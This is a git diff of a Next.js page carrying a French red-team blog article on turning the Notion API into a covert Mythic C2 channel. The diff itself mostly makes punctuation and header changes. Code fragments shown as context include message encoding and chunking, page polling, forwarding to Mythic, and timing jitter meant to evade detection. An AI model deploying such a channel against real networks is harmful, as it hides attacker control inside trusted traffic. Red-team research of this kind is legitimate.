@@ -1,8 +1,5 @@
 import Image from "next/image";
-import Link from "next/link";
 import {
-  ArrowLeft,
-  Globe,
   Server,
   Database,
   Code2,
@@ -13,7 +10,7 @@ import {
   Package,
   Layers,
 } from "lucide-react";
-import { Button } from "@/components/ui/button";
+import { PageHeader } from "@/components/PageHeader";
 
 function CodeBlock({
   children,
@@ -59,36 +56,24 @@ export const metadata = {
 
 export default function ArticleNotionC2Page() {
   return (
-    <div className="container mx-auto max-w-4xl px-4 py-12">
-      <Button variant="ghost" size="sm" asChild className="mb-8 gap-2">
-        <Link href="/blog">
-          <ArrowLeft className="size-4" />
-          Retour au blog
-        </Link>
-      </Button>
+    <div className="mx-auto max-w-4xl px-4 py-8 sm:px-6 lg:px-10 lg:py-10">
+      <PageHeader
+        eyebrow="Article · Red Team"
+        title="Quand Notion devient un canal C2"
+        description="Création d'un profil Mythic C2 qui détourne l'API Notion comme canal de communication covert. Living off Trusted Sites, pages de base de données comme vecteur de transport, et intégration complète dans le framework Mythic."
+        breadcrumbs={[
+          { label: "README", href: "/" },
+          { label: "Blog", href: "/blog" },
+          { label: "Notion C2" },
+        ]}
+        stats={[
+          { label: "Category", value: "Red Team" },
+          { label: "Tags", value: "Mythic · C2 · LoTS" },
+          { label: "Date", value: "2026-03-20" },
+        ]}
+      />
 
-      <article className="space-y-12">
-        {/* Header */}
-        <header>
-          <div className="flex flex-wrap gap-2 text-sm text-muted-foreground">
-            <span className="font-mono text-primary">Red Team</span>
-            <span>·</span>
-            <span>Mythic</span>
-            <span>·</span>
-            <span>C2</span>
-            <span>·</span>
-            <span>2026-03-20</span>
-          </div>
-          <h1 className="mt-2 font-mono text-3xl font-bold tracking-tight sm:text-4xl">
-            Quand Notion devient un canal C2
-          </h1>
-          <p className="mt-3 text-lg text-muted-foreground">
-            Création d&apos;un profil Mythic C2 qui détourne l&apos;API Notion
-            comme canal de communication covert. Living off Trusted Sites,
-            pages de base de données comme vecteur de transport, et intégration
-            complète dans le framework Mythic.
-          </p>
-        </header>
+      <article className="mt-8 space-y-12">
 
         {/* Section personnelle */}
         <section className="rounded-lg border border-primary/20 bg-primary/5 p-6">
@@ -109,8 +94,8 @@ export default function ArticleNotionC2Page() {
             La technique s&apos;appelle{" "}
             <strong>Living off Trusted Sites</strong> (LoTS). Le principe :
             utiliser des services légitimes, whitelistés dans les firewalls
-            d&apos;entreprise, comme infrastructure C2 —
-            Slack, Teams, GitHub, OneDrive, Notion. Le trafic est chiffré en
+            d&apos;entreprise, comme infrastructure C2 : par exemple Slack,
+            Teams, GitHub, OneDrive, Notion. Le trafic est chiffré en
             TLS, il se noie dans le reste du SaaS, et personne ne va bloquer
             Notion sans casser des flows métier.
           </p>
@@ -138,11 +123,11 @@ export default function ArticleNotionC2Page() {
           </h2>
           <ol className="list-decimal list-inside space-y-1 text-sm text-muted-foreground font-mono">
             <li>C&apos;est quoi un profil C2 Mythic ?</li>
-            <li>Design du canal — comment les messages transitent</li>
-            <li>Setup Notion — intégration, base de données, propriétés</li>
-            <li>notion_client.py — le client API</li>
-            <li>main.py — la boucle de polling côté serveur</li>
-            <li>Notion.py — la classe C2Profile Mythic</li>
+            <li>Design du canal : comment les messages transitent</li>
+            <li>Setup Notion : intégration, base de données, propriétés</li>
+            <li>notion_client.py : le client API</li>
+            <li>main.py : la boucle de polling côté serveur</li>
+            <li>Notion.py : la classe C2Profile Mythic</li>
             <li>Installation dans Mythic</li>
             <li>Limitations et considérations OPSEC</li>
           </ol>
@@ -375,7 +360,7 @@ children = [
           <div className="my-6">
             <Image
               src="/notion-db-example.png"
-              alt="Base de données Notion — exemple d'une page créée avec direction=out"
+              alt="Base de données Notion : exemple d'une page créée avec direction=out"
               width={1536}
               height={300}
               className="rounded-lg border border-border w-full"
@@ -412,7 +397,7 @@ children = [
         <section>
           <h2 className="mb-4 flex items-center gap-2 font-mono text-xl font-semibold">
             <Code2 className="size-5 text-primary" />
-            4. notion_client.py — Le client API
+            4. notion_client.py : Le client API
           </h2>
           <p className="text-muted-foreground mb-3">
             C&apos;est la couche d&apos;abstraction sur l&apos;API Notion. Toutes
@@ -430,7 +415,7 @@ children = [
             boucle si le réseau est capricieux.
           </p>
           <h3 className="mt-6 mb-3 font-mono text-lg font-semibold">
-            Créer un message — create_message()
+            Créer un message : create_message()
           </h3>
           <p className="text-muted-foreground mb-3">
             Encode les données brutes en base64, découpe en chunks de 1800 chars,
@@ -438,13 +423,13 @@ children = [
             chunks dans des blocs{" "}
             <code className="rounded bg-muted px-1">code</code> dans le corps.
             Cette méthode est fournie comme référence pour l&apos;agent côté
-            implant — le serveur lui n&apos;appelle pas{" "}
+            implant : le serveur lui n&apos;appelle pas{" "}
             <code className="rounded bg-muted px-1">create_message()</code>, il
             utilise{" "}
             <code className="rounded bg-muted px-1">create_response_page()</code>{" "}
             pour les pages <code className="rounded bg-muted px-1">direction=out</code>.
           </p>
-          <CodeBlock title="notion_client.py — create_message()">
+          <CodeBlock title="notion_client.py : create_message()">
 {`async def create_message(self, agent_id: str, data: bytes, direction: str) -> str:
     encoded = base64.b64encode(data).decode()
     chunks = [encoded[i : i + CHUNK_SIZE] for i in range(0, len(encoded), CHUNK_SIZE)]
@@ -484,7 +469,7 @@ children = [
         return resp.json()["id"]`}
           </CodeBlock>
           <h3 className="mt-6 mb-3 font-mono text-lg font-semibold">
-            Lire un message — read_message_data()
+            Lire un message : read_message_data()
           </h3>
           <p className="text-muted-foreground mb-3">
             Récupère les blocs enfants de la page, concatène le contenu des
@@ -494,7 +479,7 @@ children = [
             ce format que Mythic attend sur son endpoint{" "}
             <code className="rounded bg-muted px-1">/agent_message</code>.
           </p>
-          <CodeBlock title="notion_client.py — read_message_data()">
+          <CodeBlock title="notion_client.py : read_message_data()">
 {`async def read_message_data(self, page_id: str) -> bytes:
     async with httpx.AsyncClient() as client:
         resp = await client.get(
@@ -514,7 +499,7 @@ children = [
     return encoded.encode("utf-8")`}
           </CodeBlock>
           <h3 className="mt-6 mb-3 font-mono text-lg font-semibold">
-            Marquer comme traité — mark_processed()
+            Marquer comme traité : mark_processed()
           </h3>
           <p className="text-muted-foreground mb-3">
             Un PATCH sur la page pour cocher{" "}
@@ -523,7 +508,7 @@ children = [
             base, mais accessibles via l&apos;API si besoin. C&apos;est le
             nettoyage automatique pour éviter que la base s&apos;accumule.
           </p>
-          <CodeBlock title="notion_client.py — mark_processed()">
+          <CodeBlock title="notion_client.py : mark_processed()">
 {`async def mark_processed(self, page_id: str) -> None:
     async with httpx.AsyncClient() as client:
         resp = await client.patch(
@@ -538,7 +523,7 @@ children = [
         resp.raise_for_status()`}
           </CodeBlock>
           <h3 className="mt-6 mb-3 font-mono text-lg font-semibold">
-            Un détail sur les réponses serveur — create_response_page()
+            Un détail sur les réponses serveur : create_response_page()
           </h3>
           <p className="text-muted-foreground mb-3">
             Pour les messages direction{" "}
@@ -559,7 +544,7 @@ children = [
         <section>
           <h2 className="mb-4 flex items-center gap-2 font-mono text-xl font-semibold">
             <Server className="size-5 text-primary" />
-            5. main.py — La boucle de polling
+            5. main.py : La boucle de polling
           </h2>
           <p className="text-muted-foreground mb-3">
             C&apos;est le script qui tourne en permanence dans le container.
@@ -585,7 +570,7 @@ children = [
             <code className="rounded bg-muted px-1">mythic-cli</code> selon la
             version. Le code le gère explicitement.
           </p>
-          <CodeBlock title="main.py — load_config()">
+          <CodeBlock title="main.py : load_config()">
 {`def load_config() -> dict:
     config_path = Path(__file__).parent / "config.json"
     if config_path.exists():
@@ -605,7 +590,7 @@ children = [
     }`}
           </CodeBlock>
           <h3 className="mt-6 mb-3 font-mono text-lg font-semibold">
-            Forward vers Mythic — forward_to_mythic()
+            Forward vers Mythic : forward_to_mythic()
           </h3>
           <p className="text-muted-foreground mb-3">
             Mythic expose un endpoint interne sur le réseau Docker :{" "}
@@ -616,7 +601,7 @@ children = [
             identifie le profil. Mythic décrypte, traite, et retourne la réponse
             chiffrée.
           </p>
-          <CodeBlock title="main.py — forward_to_mythic()">
+          <CodeBlock title="main.py : forward_to_mythic()">
 {`MYTHIC_AGENT_URL = f"http://{MYTHIC_SERVER_HOST}:{MYTHIC_SERVER_PORT}/agent_message"
 
 async def forward_to_mythic(data: bytes) -> bytes:
@@ -634,7 +619,7 @@ async def forward_to_mythic(data: bytes) -> bytes:
         return resp.content`}
           </CodeBlock>
           <h3 className="mt-6 mb-3 font-mono text-lg font-semibold">
-            La boucle principale — poll_loop()
+            La boucle principale : poll_loop()
           </h3>
           <p className="text-muted-foreground mb-3">
             À chaque itération : query les pages{" "}
@@ -648,7 +633,7 @@ async def forward_to_mythic(data: bytes) -> bytes:
             marquées <code className="rounded bg-muted px-1">processed</code>{" "}
             par l&apos;agent. Puis on attend.
           </p>
-          <CodeBlock title="main.py — poll_loop() (simplifié)">
+          <CodeBlock title="main.py : poll_loop() (simplifié)">
 {`async def poll_loop(notion: NotionClient, interval: int, jitter: int) -> None:
     while True:
         # 1. Traiter les messages entrants
@@ -681,7 +666,7 @@ async def forward_to_mythic(data: bytes) -> bytes:
             mesure de base contre la détection comportementale qui cherche des
             patterns de timing réguliers.
           </p>
-          <CodeBlock title="main.py — compute_sleep()">
+          <CodeBlock title="main.py : compute_sleep()">
 {`def compute_sleep(interval: int, jitter: int) -> float:
     if jitter <= 0:
         return float(interval)
@@ -694,7 +679,7 @@ async def forward_to_mythic(data: bytes) -> bytes:
         <section>
           <h2 className="mb-4 flex items-center gap-2 font-mono text-xl font-semibold">
             <Package className="size-5 text-primary" />
-            6. Notion.py — La classe C2Profile
+            6. Notion.py : La classe C2Profile
           </h2>
           <p className="text-muted-foreground mb-3">
             C&apos;est le point d&apos;entrée que Mythic charge via{" "}
@@ -818,7 +803,7 @@ mythic_container.mythic_service.start_and_run_forever()`}
           </p>
           <ul className="list-disc list-inside space-y-1 text-sm text-muted-foreground mb-4">
             <li>
-              <code className="rounded bg-muted px-1">integration_token</code> —
+              <code className="rounded bg-muted px-1">integration_token</code> :
               le token Notion (<code className="rounded bg-muted px-1">ntn_...</code>)
             </li>
             <li>
@@ -884,7 +869,7 @@ mythic_container.mythic_service.start_and_run_forever()`}
             pour une session interactive.
           </p>
           <h3 className="mt-6 mb-3 font-mono text-lg font-semibold">
-            OPSEC — token et base de données
+            OPSEC : token et base de données
           </h3>
           <p className="text-muted-foreground mb-3">
             Le token d&apos;intégration Notion est la clé de toute
